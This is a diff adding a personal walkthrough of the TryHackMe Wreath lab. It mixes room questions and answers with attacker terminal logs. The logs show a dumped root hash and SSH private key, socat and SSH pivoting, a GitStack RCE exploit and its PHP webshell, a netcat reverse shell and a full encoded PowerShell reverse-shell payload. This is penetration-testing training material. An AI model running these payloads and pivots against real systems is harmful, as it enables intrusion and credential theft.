@@ -2049,3 +2049,1029 @@ sshd:!!:18573::::::
 chrony:!!:18573::::::
 rngd:!!:18573::::::
 twreath:$6$0my5n311RD7EiK3J$zVFV3WAPCm/dBxzz0a7uDwbQenLohKiunjlDonkqx1huhjmFYZe0RmCPsHmW3OnWYwf8RWPdXAdbtYpkJCReg.::0:99999:7:::
+unbound:!!:18573::::::
+apache:!!:18573::::::
+nginx:!!:18573::::::
+mysql:!!:18573::::::
+
+sh-4.4# cd /root/.ssh/
+cd /root/.ssh/
+sh-4.4# ls
+ls
+authorized_keys
+id_rsa
+id_rsa.pub
+known_hosts
+sh-4.4# cat id_rsa
+cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ nano wreath_idrsa        
+                                                                                  
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ chmod 600 wreath_idrsa
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i wreath_idrsa root@10.200.84.200 
+The authenticity of host '10.200.84.200 (10.200.84.200)' can't be established.
+ED25519 key fingerprint is SHA256:7Mnhtkf/5Cs1mRaS3g6PGYXnU8u8ajdIqKU9lQpmYL4.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.200.84.200' (ED25519) to the list of known hosts.
+[root@prod-serv ~]# whoami
+root
+```
+Run the exploit and obtain a pseudoshell on the target!
+Completed
+Which user was the server running as?
+Type "whoami" and press enter.
+*root*
+Success! We won't need to escalate privileges here, so we can move on to the next step in the exploitation process.
+Before we do though: nice though this pseudoshell is, it's not a full reverse shell.
+Get a reverse shell from the target. You can either do this manually, or by typing `shell` into the pseudoshell and following the instructions given.
+Completed
+**Optional:** Stabilise the reverse shell. There are several techniques for doing this detailed [here](https://tryhackme.com/room/introtoshells).
+Completed
+Now for a little post-exploitation!
+What is the root user's password hash?
+Where are passwords stored in Linux systems?
+*$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1*
+You won't be able to crack the root password hash, but you might be able to find a certain file that will give you consistent access to the root user account through one of the other services on the box.
+What is the full path to this file?
+Where are SSH keys usually stored?
+*/root/.ssh/id_rsa*
+Download the key (copying and pasting it to a file on your own Attacking Machine works), then use the command `chmod 600 KEY_NAME` (substituting in the name of the key) to obtain persistent access to the box.
+We have everything we need for now. Let's move on to the next section: Pivoting!
+Question Done
+### Task 7  Pivoting What is Pivoting?
+[**Video**](https://youtu.be/seYiYHHJOkc)
+Pivoting is the art of using access obtained over one machine to exploit another machine deeper in the network. It is one of the most essential aspects of network penetration testing, and is one of the three main teaching points for this room.
+Put simply, by using one of the techniques described in the following tasks (or others!), it becomes possible for an attacker to gain initial access to a remote network, and use it to access other machines in the network that would not otherwise be accessible:
+![Diagram showing an attacker machine outwith a target network with one public facing webserver and three terminals in an internal network.](https://assets.tryhackme.com/additional/wreath-network/6904b85a9b93.png)
+In this diagram, there are four machines on the target network: one public facing server, with three machines which are not exposed to the internet. By accessing the public server, we can then pivot to attack the remaining three targets.
+_**Note:** This is an example diagram and is not representative of the Wreath Network._
+This section will contain a lot of theory for pivoting from both Linux and Windows compromised targets, which we will then put into practice against the next machine in the network. Remember though: you have a sandbox environment available to you with the compromised machine in the Wreath network. After the enumeration tasks coming up, you'll also know about the next machine in the network. Feel free to use these boxes to play around with the tools as you go through the tasks, but be aware that some techniques may be stopped by the firewalls involved (which we will look at mitigating later in the network).
+Answer the questions below
+Read the pivoting introduction
+Question Done
+```text
+┌──(witty㉿kali)-[~/Downloads/wreath/.ssh]
+└─$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/witty/.ssh/id_rsa): /home/witty/Downloads/wreath/.ssh/id_rsa
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/witty/Downloads/wreath/.ssh/id_rsa
+Your public key has been saved in /home/witty/Downloads/wreath/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:5VyU8w6c5H0B5zSD6ZIoKF+eMUPn+tevPS8VbrLkPKI witty@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|            .o+= |
+|       . . .+o+.o|
+|      o o o++= ..|
+|   . . * * +=.o..|
+|    o o S o .o...|
+|     . +     o.o.|
+|        .   = +. |
+|         . o *o. |
+|         Eo ..+++|
++----[SHA256]-----+
+
+┌──(witty㉿kali)-[~/Downloads/wreath/.ssh]
+└─$ head id_rsa.pub 
+command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty ssh-rsa ...
+
+┌──(witty㉿kali)-[~/Downloads/wreath]
+└─$ sudo systemctl status ssh
+● ssh.service - OpenBSD Secure Shell server
+     Loaded: loaded (/lib/systemd/system/ssh.service; enabled; preset: disabled)
+     Active: active (running) since Sat  EDT; 6 days ago
+
+[root@prod-serv .ssh]# echo "command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty ssh-rsa ...." >> authorized_keys
+-bash: authorized_keys: Operation not permitted
+[root@prod-serv .ssh]# nano authorized_keys 
+[root@prod-serv .ssh]# ls
+authorized_keys  id_rsa  id_rsa.pub  known_hosts
+[root@prod-serv .ssh]#                       
+
+┌──(witty㉿kali)-[~/Downloads/wreath]
+└─$ ps aux | grep ssh
+root         719  0.0  0.1  15648  8492 ?        Ss   Jun08   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+witty       1394  0.0  0.0   7908  2352 ?        Ss   Jun08   0:03 /usr/bin/ssh-agent x-session-manager
+witty     793025  0.1  0.1  16544  9672 pts/3    S+   12:59   0:00 ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i wreath_idrsa root@10.200.81.200
+witty     795429  0.0  0.0   6464  2072 pts/2    S+   13:09   0:00 grep --color=auto ssh
+                               
+┌──(witty㉿kali)-[~/Downloads/wreath]
+└─$ sudo kill 793025         
+
+┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$
+```
+If you're connecting to an SSH server _from_ your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?
+*L*
+Which switch combination can be used to background an SSH port forward or tunnel?
+*-fN*
+It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?
+*Nay*
+What command would you use to create a pair of throwaway SSH keys for a reverse connection?
+*ssh-keygen*
+If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called `id_rsa` and backgrounding the shell, what command would you use? (Assume your username is "kali")
+*ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN*
+What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?
+*ssh -D 8000 user@target.thm -fN*
+If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.
+*ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN*
+```text
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.200.81.200 - - [10/Jun/2023 20:40:53] "GET /socat HTTP/1.1" 200 -
+
+[root@prod-serv witty]# curl 10.50.82.74:1234/socat -o /tmp/socat-witty && chmod +x /tmp/witty
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  366k  100  366k    0     0   295k      0  0:00:01  0:00:01 --:--:--  295k
+
+[root@prod-serv tmp]# mv socat-witty witty/
+[root@prod-serv tmp]# cd witty/
+[root@prod-serv witty]# ls
+socat-witty
+
+[root@prod-serv witty]# chmod +x socat-witty 
+[root@prod-serv witty]# ./socat-witty tcp-l:8000 tcp:10.50.82.74:443 &
+[1] 2059
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sudo nc -lvnp 443   
+listening on [any] 443 ...
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ scp -o PubkeyAcceptedKeyTypes=ssh-rsa -i wreath_idrsa root@10.200.81.200:/tmp/nc .
+nc                                                       100%  762KB 423.0KB/s   00:01  
+
+[root@prod-serv tmp]# ./nc 127.0.0.1 8000 -e /bin/bash
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sudo nc -lvnp 443   
+[sudo] password for witty: 
+listening on [any] 443 ...
+connect to [10.50.82.74] from (UNKNOWN) [10.200.81.200] 53094
+whoami
+root
+
+[root@prod-serv tmp]# jobs
+[1]+  Done                    ./socat-witty tcp-l:8000 tcp:10.50.82.74:443  (wd: /tmp/witty)
+[root@prod-serv tmp]# kill %1
+```
+Which socat option allows you to reuse the same listening port for more than one connection?
+*reuseaddr*
+If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?
+Use TCP port 8000 for the server listener, and **do not** background the process.
+./socat tcp-l:LISTEN_PORT tcp:ATTACKING_IP:ATTACKING_PORT
+*./socat tcp-l:8000 tcp:172.16.0.200:443*
+What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?
+Remember to add the fork and reuseaddr options!
+*./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &*
+**Bonus Question (Optional):** Try to create an encrypted port forward or relay using the `OPENSSL` options in socat. Task 7 of the [shells](https://tryhackme.com/room/introtoshells) room may help with this.
+Question Done
+```text
+like using in Holo network
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ sshuttle -r root@10.200.81.200 --ssh-cmd "ssh -i wreath_idrsa" 10.200.81.0/24 -x 10.200.81.200
+c : Connected to server.
+```
+How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16
+*sshuttle -r pwned@172.16.20.7 172.16.0.0/16*
+What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?
+Use Double quotes, as in the task.
+*--ssh-cmd "ssh  -i priv_key"*
+You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error.
+What switch (and argument) could you use to fix this error?
+*-x 172.16.0.100*
+```text
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ sshuttle -r root@10.200.81.200 --ssh-cmd "ssh -i wreath_idrsa" 10.200.81.0/24 -x 10.200.81.200
+c : Connected to server.
+
+http://10.200.81.150/gitstack/
+
+admin:admin
+Your username and password didn't match. Please try again. 
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ searchsploit gitstack
+----------------------------------------- ---------------------------------
+ Exploit Title                           |  Path
+----------------------------------------- ---------------------------------
+GitStack - Remote Code Execution         | php/webapps/44044.md
+GitStack - Unsanitized Argument Remote C | windows/remote/44356.rb
+GitStack 2.3.10 - Remote Code Execution  | php/webapps/43777.py
+----------------------------------------- -----------------------------
+```
+What is the name of the program running the service?
+When you first connect to the service you will see an error screen with three expected routing patterns given. The second pattern (without the symbols at the start and end) is the answer to this question. Append it to the URL to get to a login screen.
+*Gitstack*
+Head to the login screen of this application. This can be done by adding the answer to the previous question on at the end of the url, e.g. if using sshuttle:
+`http://IP/ANSWER`
+When navigating to this URI, we are given the following login page:
+![Image showing the login screen for the service](https://assets.tryhackme.com/additional/wreath-network/409f76a17496.png)
+Do these default credentials work (Aye/Nay)?
+*Nay*
+Shucks -- it couldn't be that easy, huh? Back to the drawing board then!
+Use the command: `searchsploit SERVICENAME`, on Kali to search for exploits related to this service.
+Question done
+You will see that there are three publicly available exploits.
+There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?
+The EDB ID number is given as part of the exploit name. Look under the "Path" column of the results table. You're looking for an exploit called NUMBER.py. The number (by itself, without the file extension) is the answer to this question.
+*43777*
+[**Video**](https://youtu.be/qzqIregBG7A)
+In the previous task we had a look through the source code of the exploit we found, identified the lines which needed to be updated, then made the necessary changes.
+It is now time to run the exploit!
+![Exploit PoC in action!](https://assets.tryhackme.com/additional/wreath-network/d7bd5d950eae.png)
+Success!
+Not only did the exploit work perfectly, it gave us command execution as NT AUTHORITY\SYSTEM, the highest ranking local account on a Windows target.
+From here we want to obtain a full reverse shell. We have two options for this:
+1. We could change the command in the exploit and re-run the code
+2. We could use our knowledge of the script to leverage the same webshell to execute more commands for us, without performing the full exploit twice
+Option number two is a lot quieter than option number 1, so let's use that.
+---
+The webshell we have uploaded responds to a POST request using the parameter "`a`" (by default). This means that we have two easy ways to access this. We could use cURL from the command line, or BurpSuite for a GUI option.
+**With cURL:**
+`curl -X POST http://IP/web/exploit-USERNAME.php -d "a=COMMAND"`
+![Using cURL to activate the webshell, gaining the same result as in the previous screenshot](https://assets.tryhackme.com/additional/wreath-network/c4fb965ea6f5.png)
+_**Note:** in this screenshot,_ `gitserver.thm` _has been added to the_ `/etc/hosts` _file on the attacking machine, mapped to the target IP address._
+**With BurpSuite:**
+We first turn on our Burp proxy (see the [Burpsuite room](https://tryhackme.com/room/rpburpsuite) if you need help with this!) and navigate to the exploit URL:
+![Capturing a request with BurpSuite](https://assets.tryhackme.com/additional/wreath-network/3b9c350a53d8.png)
+We then press `Ctrl + R` to send the request to Repeater on the top menu.
+Next we change the "GET" on line 1 to "POST". We then add a `Content-Type` header on line 9 to tell the server to accept POST paramters:
+`Content-Type: application/x-www-form-urlencoded`
+Finally, on line 11 we add `a=COMMAND`:
+![The altered request with POST, the content-type header, and the payload (a=whoami) highlighted](https://assets.tryhackme.com/additional/wreath-network/640de3e036a9.png)
+Press send, and see the response come in!
+![Activated the webshell with Burpsuite](https://assets.tryhackme.com/additional/wreath-network/063482e92f8b.png)
+---
+With two methods available, pick your favourite and we'll aim for a shell!
+Answer the questions below
+```text
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ ./43777.py       
+[+] Get user list
+[+] Found user twreath
+[+] Web repository already enabled
+[+] Get repositories list
+[+] Found repository Website
+[+] Add user to repository
+[+] Disable access for anyone
+[+] Create backdoor in PHP
+Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. 
+[+] Execute command
+"nt authority\system
+" 
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ curl -X POST http://10.200.81.150/web/exploit_witty.php -d "a=whoami" 
+"nt authority\system
+" 
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ curl -X POST http://10.200.81.150/web/exploit_witty.php -d "a=dir"     
+" Volume in drive C has no label.
+ Volume Serial Number is C0B9-B671
+
+ Directory of C:\GitStack\gitphp
+
+13/06/2023  00:49    <DIR>          .
+13/06/2023  00:49    <DIR>          ..
+08/11/2020  14:28    <DIR>          cache
+08/11/2020  14:29    <DIR>          config
+08/11/2020  14:28    <DIR>          css
+08/11/2020  14:28    <DIR>          doc
+11/06/2023  15:05                34 exploit-donhew.php
+12/06/2023  08:15                34 exploit-zstt.php
+13/06/2023  00:49                34 exploit_witty.php
+08/11/2020  14:28    <DIR>          images
+08/11/2020  14:28    <DIR>          include
+16/05/2012  14:20             5,742 index.php
+08/11/2020  14:28    <DIR>          js
+08/11/2020  14:28    <DIR>          lib
+08/11/2020  14:28    <DIR>          locale
+08/11/2020  14:28    <DIR>          templates
+08/11/2020  14:28    <DIR>          templates_c
+               4 File(s)          5,844 bytes
+              13 Dir(s)   7,285,907,456 bytes free
+" 
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ curl -X POST http://10.200.81.150/web/exploit_witty.php -d "a=ipconfig"
+"
+Windows IP Configuration
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
+   Link-local IPv6 Address . . . . . : fe80::400d:f003:1ec4:5e33%6
+   IPv4 Address. . . . . . . . . . . : 10.200.81.150
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.200.81.1
+" 
+
+Using burp
+
+Request:
+
+POST /web/exploit_witty.php HTTP/1.1
+Host: 10.200.81.150
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: csrftoken=pmWxt....; 
+sessionid=adc81646a36e7b2dcf83ec64aef68475
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 12
+
+a=whoami
+
+Reponse:
+
+HTTP/1.1 200 OK
+Date: Mon, 12 Jun 2023 23:56:41 GMT
+Server: Apache/2.2.22 (Win32) mod_ssl/2.2.22 OpenSSL/0.9.8u mod_wsgi/3.3 Python/2.7.2 PHP/5.4.3
+X-Powered-By: PHP/5.4.3
+Content-Length: 26
+Connection: close
+Content-Type: text/html
+
+"nt authority\system
+" 
+
+a=hostname
+git-serv
+
+a=uname
+"" 
+
+So Windows OS let's see
+
+a=systeminfo
+
+Host Name:                 GIT-SERV
+
+OS Name:                   Microsoft Windows Server 2019 Standard
+
+OS Version:                10.0.17763 N/A Build 17763
+
+OS Manufacturer:           Microsoft Corporation
+
+OS Configuration:          Standalone Server
+
+OS Build Type:             Multiprocessor Free
+
+Registered Owner:          Windows User
+
+Registered Organization:   
+
+Product ID:                00429-70000-00000-AA159
+
+Original Install Date:     08/11/2020, 13:19:49
+
+System Boot Time:          13/06/2023, 00:23:17
+
+System Manufacturer:       Xen
+
+System Model:              HVM domU
+
+System Type:               x64-based PC
+
+Processor(s):              1 Processor(s) Installed.
+
+                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
+
+BIOS Version:              Xen 4.11.amazon, 24/08/2006
+
+Windows Directory:         C:\Windows
+
+System Directory:          C:\Windows\system32
+
+Boot Device:               \Device\HarddiskVolume1
+
+System Locale:             en-gb;English (United Kingdom)
+
+Input Locale:              en-gb;English (United Kingdom)
+
+Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
+
+Total Physical Memory:     2,048 MB
+
+Available Physical Memory: 1,376 MB
+
+Virtual Memory: Max Size:  2,432 MB
+
+Virtual Memory: Available: 1,869 MB
+
+Virtual Memory: In Use:    563 MB
+
+Page File Location(s):     C:\pagefile.sys
+
+Domain:                    WORKGROUP
+
+Logon Server:              N/A
+
+Hotfix(s):                 5 Hotfix(s) Installed.
+
+                           [01]: KB4580422
+
+                           [02]: KB4512577
+
+                           [03]: KB4580325
+
+                           [04]: KB4587735
+
+                           [05]: KB4592440
+
+Network Card(s):           1 NIC(s) Installed.
+
+                           [01]: AWS PV Network Device
+
+                                 Connection Name: Ethernet
+
+                                 DHCP Enabled:    Yes
+
+                                 DHCP Server:     10.200.81.1
+
+                                 IP address(es)
+
+                                 [01]: 10.200.81.150
+
+                                 [02]: fe80::400d:f003:1ec4:5e33
+
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ ip -a link | grep tun0
+12: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN mode DEFAULT group default qlen 500
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ ip addr | grep tun0
+12: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
+    inet 10.50.82.74/24 scope global tun0
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ sudo tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+
+a=ping -n 3 10.50.82.74
+
+Pinging 10.50.82.74 with 32 bytes of data:
+Request timed out.
+Request timed out.
+Request timed out.
+Ping statistics for 10.50.82.74:
+    Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.200.81.200 - - [12/Jun/2023 20:11:55] "GET /ncat HTTP/1.1" 200 -
+
+[root@prod-serv tmp]# cd witty/
+[root@prod-serv witty]# ls
+nmap_witty
+[root@prod-serv witty]# curl http://10.50.82.74:1234/ncat -o ncat_witty
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 2846k  100 2846k    0     0   363k      0  0:00:07  0:00:07 --:--:--  565k
+
+[root@prod-serv witty]# firewall-cmd --zone=public --add-port 31337/tcp
+success
+
+[root@prod-serv witty]# chmod +x ncat_witty
+[root@prod-serv witty]# ./ncat_witty -lvnp 31337
+Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
+Ncat: Listening on :::31337
+Ncat: Listening on 0.0.0.0:31337
+
+a=powershell.exe+-c+"$client+%3d+New-Object+System.Net.Sockets.TCPClient('10.200.81.200',31337)%3b$stream+%3d+$client.GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream.Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()"
+
+[root@prod-serv witty]# ./ncat_witty -lvnp 31337
+Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
+Ncat: Listening on :::31337
+Ncat: Listening on 0.0.0.0:31337
+Ncat: Connection from 10.200.81.150.
+Ncat: Connection from 10.200.81.150:50045.
+hostname
+git-serv
+PS C:\GitStack\gitphp>
+```
+**Bonus Question (Optional):** Using the given code for the exploit we used against the web server, see if you can adapt this exploit to create a full pseudoshell environment.
+Question Done
+First up, let's use some basic enumeration to get to grips with the webshell:
+What is the hostname for this target?
+*git-serv*
+What operating system is this target?
+*Windows*
+What user is the server running as?
+*nt authority\system*
+Before we go for a reverse shell, we need to establish whether or not this target is allowed to connect to the outside world. The typical way of doing this is by executing the `ping` command on the compromised server to ping our own IP and using a network interceptor (Wireshark, TCPDump, etc) to see if the ICMP echo requests make it through. If they do then network connectivity is established, otherwise we may need to go back to the drawing board.
+To start up a TCPDump listener we would use the following command:
+`tcpdump -i tun0 icmp`
+_**Note:** if your VPN is not using the tun0 interface then you will need to replace this with the correct interface for your system which can be found using_ `ip -a link` _to see the available interfaces._
+Now, using the webshell, execute the following ping command (substituting in your own VPN IP!):
+`ping -n 3 ATTACKING_IP   `
+This will send three ICMP ping packets back to you.
+How many make it to the waiting listener?
+*0*
+Looks like we're going to need to think outside the box to catch this shell.
+We have two easy options here:
+- Given we have a fully stable shell on .200, we could upload a static copy of [netcat](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat) and just catch the shell here
+- We could set up a relay on .200 to forward a shell back to a listener
+It is up to you which option you choose (although for the sake of practice, a socat relay is suggested); however, whichever way you choose, please be mindful of other users at earlier stages of the network and **ensure that any ports you open are above 15000.**
+Before we can do this, however, we need to take one other thing into account. CentOS uses an always-on wrapper around the IPTables firewall called "firewalld". By default, this firewall is extremely restrictive, only allowing access to SSH and anything else the sysadmin has specified. Before we can start capturing (or relaying) shells, we will need to open our desired port in the firewall. This can be done with the following command:
+`firewall-cmd --zone=public --add-port PORT/tcp`
+Substituting in your desired choice of port.
+In this command we are using two switches. First we set the zone to public -- meaning that the rule will apply to every inbound connection to this port. We then specify which port we want to open, along with the protocol we want to use (TCP).
+With that done, set up either a listener or a relay on .200.
+Question Done
